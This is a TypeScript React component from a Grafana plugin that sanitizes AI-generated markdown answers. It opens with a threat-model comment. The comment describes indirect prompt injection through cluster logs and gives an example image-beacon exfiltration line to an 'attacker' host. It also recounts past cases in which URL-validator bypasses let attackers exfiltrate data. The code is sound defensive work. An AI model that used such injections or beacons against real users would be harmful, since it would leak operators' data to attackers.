import React, { useMemo } from 'react';
import { css } from '@emotion/css';
import { GrafanaTheme2, textUtil } from '@grafana/data';
import { useStyles2 } from '@grafana/ui';
import { Marked } from 'marked';
import { testIds } from './testIds';

/**
 * Threat model — the dot-ai answer is UNTRUSTED INPUT.
 *
 * The answer is produced by a model whose prompt is packed with cluster telemetry: Loki
 * lines, Alertmanager annotations, Tempo span attributes, Kubernetes object metadata.
 * Anyone who can emit a log line or name a resource in a monitored cluster can put text in
 * that prompt — including someone outside the organisation, via a request header or a 404
 * path reflected into an access log. So this component renders attacker-influenced content
 * inside an operator's authenticated Grafana session, and the payoff needs no script
 * execution: one `<img src="https://attacker/?e=...">` beacons that the panel rendered,
 * when, and — in the query string — what the evidence said.
 *
 * WHAT THIS PIPELINE GUARANTEES
 *
 * 1. No raw HTML from the answer is ever emitted as markup. HTML tokens are re-escaped and
 *    rendered as visible text, so a log line that legitimately contains `<div>` shows up
 *    verbatim instead of becoming a node.
 * 2. No element that can fetch a remote resource is ever emitted — not `img`, `iframe`,
 *    `video`, `audio`, `object`, `embed`, `svg`, `source`, `track`, `link`. They are not
 *    URL-checked; they are never produced. Markdown image syntax renders its alt text.
 * 3. The only model-influenced attribute that survives is `a[href]`, restricted to
 *    absolute `https:` or a same-origin Grafana path, with `rel="noopener noreferrer"`.
 * 4. Nothing in the render path fetches a URL the model chose. Only a user click navigates.
 * 5. If any stage throws, the answer renders as escaped plain text — never as raw HTML.
 *
 * WHY GRAFANA'S OWN `renderMarkdown` IS NOT USED HERE
 *
 * `renderMarkdown` routes to `sanitizeTextPanelContent`, a js-xss `FilterXSS` whitelist
 * written for the Text *panel* — markdown an authenticated editor typed by hand. Measured
 * against @grafana/data 11.4.0, that whitelist lets through `<img src>`, `<iframe
 * src/width/height>`, `<video>`/`<audio>`, `target="_blank"` with no `rel`, and `style`
 * (it adds `class` and `style` to every allowed tag, so `style="background:url(...)"`
 * survives and CSS `url()` fetches without a click). It does block `<script>`, `on*`
 * handlers and `javascript:` URLs. It is the right sanitizer for its own use case and the
 * wrong one for ours, so it is not in this path at all — this component parses with its
 * own `Marked` instance and applies its own allowlist.
 *
 * WHY ELEMENTS ARE REMOVED RATHER THAN THEIR URLS VALIDATED
 *
 * URL validation is the control that has already failed in the field, in this product
 * family. GrafanaGhost (Noma Security, 2026-04-07, patched) was an indirect prompt
 * injection into Grafana's own AI assistant that exfiltrated via a markdown image beacon,
 * with no login and no click, defeating a client-side image-URL validator with a
 * protocol-relative `//host` URL. js-xss has the same hole by construction: its
 * `safeAttrValue` accepts any `href`/`src` beginning with `/`. CamoLeak (GitHub Copilot
 * Chat, October 2025, CVSS 9.6, https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability)
 * was fixed by GitHub disabling image rendering outright. And CVE-2026-17033 (published
 * 2026-08-24, CVSS 6.8, fixed in Grafana >= 13.1.0) defeated a second URL heuristic in
 * Grafana's own non-AI code — the Alertmanager `generatorURL` click interceptor's `://`
 * check, bypassed by hiding `://` inside a JavaScript comment. Three different inspection
 * heuristics, three bypasses; the `style`/CSS `url()` path above is a fourth exit that no
 * URL-scheme check would even have been asked about. Hence: never emit a remote-reference
 * element, strip `style` from every tag, and reject protocol-relative hrefs explicitly.
 *
 * A note on layering: parser-level suppression (below) is the control. The DOM allowlist
 * after it is defence in depth — it is what strips the `language-*` class marked derives
 * from a model-chosen fence info string, and what would catch any element a future marked
 * version learns to emit.
 */

/** HTML-escape a string so it can only ever be text. */
function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/** Marker appended to external links so the destination is visible, not just hoverable. */
export const EXTERNAL_LINK_MARKER = ' \u2197';

/**
 * Vetted href, or undefined when the anchor must be demoted to plain text.
 *
 * Allowed: absolute `https:`, and a same-origin Grafana path (`/d/...`). Everything else —
 * `http:` (downgrade), `mailto:`, `javascript:`, `data:`, `vbscript:`, bare relative text,
 * and above all the protocol-relative `//host` form that beat Grafana's own validator — is
 * rejected. `textUtil.sanitizeUrl` runs first: it is Grafana's @braintree/sanitize-url
 * wrapper, which strips control characters and collapses executable schemes to
 * `about:blank`, which then fails the checks below.
 */
export function safeHref(raw: string): string | undefined {
  const cleaned = textUtil.sanitizeUrl(raw.trim());

  // `//host/x` and `/\host/x` are protocol-relative: the browser resolves them off-origin.
  if (/^[/\\]{2}/.test(cleaned)) {
    return undefined;
  }

  // Same-origin Grafana path.
  if (/^\/(?![/\\])/.test(cleaned)) {
    return cleaned;
  }

  try {
    if (new URL(cleaned).protocol === 'https:') {
      return cleaned;
    }
  } catch {
    return undefined;
  }
  return undefined;
}

/** True when the link leaves this Grafana origin. */
function isExternal(href: string): boolean {
  if (href.startsWith('/')) {
    return false;
  }
  try {
    return new URL(href).origin !== window.location.origin;
  } catch {
    return true;
  }
}

function anchor(href: string, inner: string): string {
  const external = isExternal(href);
  const attrs = [
    `href="${escapeHtml(href)}"`,
    'rel="noopener noreferrer"',
    ...(external ? ['target="_blank"', `title="External link (opens in a new tab): ${escapeHtml(href)}"`] : []),
  ].join(' ');
  return `<a ${attrs}>${inner}${external ? EXTERNAL_LINK_MARKER : ''}</a>`;
}

/**
 * This plugin's own parser instance. It MUST NOT be the `marked` singleton: `marked` stores
 * options and extensions globally and Grafana's `renderMarkdown` calls `setOptions`/`use`
 * on that singleton, so overriding it here would change Text-panel rendering app-wide.
 *
 * `marked` removed its `sanitize`/`sanitizer` options in v8, so raw-HTML suppression is a
 * renderer override. Verified against marked 12.0.2: `html` receives the raw source (so it
 * is escaped here), while `image`/`link` receive an already-escaped `text` argument (so it
 * is passed through as-is — escaping it again would show `&amp;lt;`).
 */
const answerMarked = new Marked({
  gfm: true,
  breaks: true,
  renderer: {
    // Raw HTML in the answer becomes visible text, never markup. This closes the whole
    // class — script, media, embeds, event handlers, style attributes — at the parser,
    // rather than filtering instances of it afterwards.
    html(html: string, block?: boolean) {
      const escaped = escapeHtml(html.trim());
      return block ? `<p>${escaped}</p>` : escaped;
    },
    // Markdown image syntax never yields a fetching element. The alt text survives; the
    // URL is discarded, so there is nothing left to beacon with.
    image(_href: string, _title: string | null | undefined, text: string) {
      return text;
    },
    link(href: string, _title: string | null | undefined, text: string) {
      const safe = safeHref(href);
      return safe ? anchor(safe, text) : text;
    },
  },
});

/**
 * Second layer: tag -> attributes that may survive on it.
 * A tag absent from this table is never emitted as an element.
 */
const ALLOWED_ATTRS: Readonly<Record<string, readonly string[] | undefined>> = {
  p: [],
  br: [],
  hr: [],
  blockquote: [],
  strong: [],
  em: [],
  del: [],
  code: [],
  pre: [],
  ul: [],
  ol: [],
  li: [],
  h1: [],
  h2: [],
  h3: [],
  h4: [],
  h5: [],
  h6: [],
  table: [],
  thead: [],
  tbody: [],
  tfoot: [],
  tr: [],
  th: [],
  td: [],
  a: ['href', 'rel', 'target', 'title'],
};

/**
 * Cosmetic, NOT the security boundary: a disallowed tag is always removed either way.
 * This table only decides whether its text children are kept. Text inside these tags is
 * markup/binary/control content that would be noise if surfaced, so the subtree goes.
 */
const DROP_SUBTREE: Readonly<Record<string, true>> = {
  script: true,
  style: true,
  template: true,
  noscript: true,
  iframe: true,
  object: true,
  embed: true,
  applet: true,
  svg: true,
  math: true,
  canvas: true,
  link: true,
  meta: true,
  base: true,
  title: true,
  head: true,
  form: true,
  input: true,
  button: true,
  select: true,
  option: true,
  textarea: true,
  img: true,
  picture: true,
  source: true,
  video: true,
  audio: true,
  track: true,
  frame: true,
  frameset: true,
};

/** Replace `el` with its child nodes, keeping their order. */
function unwrap(el: Element): void {
  const parent = el.parentNode;
  if (!parent) {
    return;
  }
  while (el.firstChild) {
    parent.insertBefore(el.firstChild, el);
  }
  parent.removeChild(el);
}

function scrubElement(el: Element): void {
  const tag = el.tagName.toLowerCase();
  const allowed = ALLOWED_ATTRS[tag];

  if (!allowed) {
    if (DROP_SUBTREE[tag]) {
      el.remove();
    } else {
      // Recurse before unwrapping: the children move up, so scrub them in place first.
      scrubChildren(el);
      unwrap(el);
    }
    return;
  }

  // Attributes: drop everything not named for this tag. This is what removes `style`,
  // `class` (including marked's model-derived `language-*`), `id`, `srcset` and every
  // `on*` handler in one pass.
  for (const attr of Array.from(el.attributes)) {
    if (!allowed.includes(attr.name.toLowerCase())) {
      el.removeAttribute(attr.name);
    }
  }

  if (tag === 'a') {
    const href = safeHref(el.getAttribute('href') ?? '');
    if (!href) {
      scrubChildren(el);
      unwrap(el);
      return;
    }
    el.setAttribute('href', href);
    el.setAttribute('rel', 'noopener noreferrer');
    if (isExternal(href)) {
      el.setAttribute('target', '_blank');
    } else {
      el.removeAttribute('target');
    }
  }

  scrubChildren(el);
}

function scrubChildren(parent: Element): void {
  for (const child of Array.from(parent.children)) {
    scrubElement(child);
  }
}

/**
 * Apply the element/attribute allowlist to an HTML string. Exported so the unit tests can
 * assert the boundary directly; the component below is the only production caller — and the
 * only place in this plugin that uses `dangerouslySetInnerHTML`.
 */
export function sanitizeAnswerHtml(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  scrubChildren(doc.body);
  return doc.body.innerHTML;
}

/**
 * Render the answer, or `undefined` when it could not be rendered safely and the caller
 * must fall back to escaped plain text. Fail closed: a sanitiser or parser failure degrades
 * to safe, never to unfiltered.
 */
export function renderAnswerHtml(text: string): string | undefined {
  try {
    const parsed = answerMarked.parse(text, { async: false });
    if (typeof parsed !== 'string') {
      return undefined;
    }
    return sanitizeAnswerHtml(parsed);
  } catch {
    return undefined;
  }
}

/** Render an untrusted dot-ai answer as markdown. See the threat model at the top. */
export function ResponseMarkdown({ text }: { text: string }) {
  const styles = useStyles2(getStyles);
  const html = useMemo(() => renderAnswerHtml(text), [text]);

  if (html === undefined) {
    // React escapes text children, so the answer stays visible and stays inert.
    return (
      <div className={styles.plain} data-testid={testIds.dotai.answerMarkdown}>
        {text}
      </div>
    );
  }

  return (
    <div
      className={styles.md}
      data-testid={testIds.dotai.answerMarkdown}
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}

const getStyles = (theme: GrafanaTheme2) => ({
  plain: css`
    color: ${theme.colors.text.primary};
    font-size: ${theme.typography.body.fontSize};
    font-family: ${theme.typography.fontFamilyMonospace};
    white-space: pre-wrap;
    word-break: break-word;
  `,
  md: css`
    color: ${theme.colors.text.primary};
    font-size: ${theme.typography.body.fontSize};
    line-height: ${theme.typography.body.lineHeight};

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
      margin: ${theme.spacing(1.5, 0, 1, 0)};
      font-size: ${theme.typography.h5.fontSize};
    }

    p {
      margin: 0 0 ${theme.spacing(1)} 0;
    }

    ul,
    ol {
      margin: 0 0 ${theme.spacing(1)} 0;
      padding-left: ${theme.spacing(3)};
    }

    code {
      font-family: ${theme.typography.fontFamilyMonospace};
      font-size: ${theme.typography.bodySmall.fontSize};
      background: ${theme.colors.background.canvas};
      padding: 0 ${theme.spacing(0.5)};
    }

    pre {
      margin: 0 0 ${theme.spacing(1)} 0;
      padding: ${theme.spacing(1)};
      overflow: auto;
      background: ${theme.colors.background.canvas};
      border-radius: ${theme.shape.radius.default};

      code {
        padding: 0;
        background: none;
      }
    }

    table {
      border-collapse: collapse;
      margin-bottom: ${theme.spacing(1)};
    }

    th,
    td {
      border: 1px solid ${theme.colors.border.weak};
      padding: ${theme.spacing(0.5, 1)};
    }

    a {
      color: ${theme.colors.text.link};
    }
  `,
});
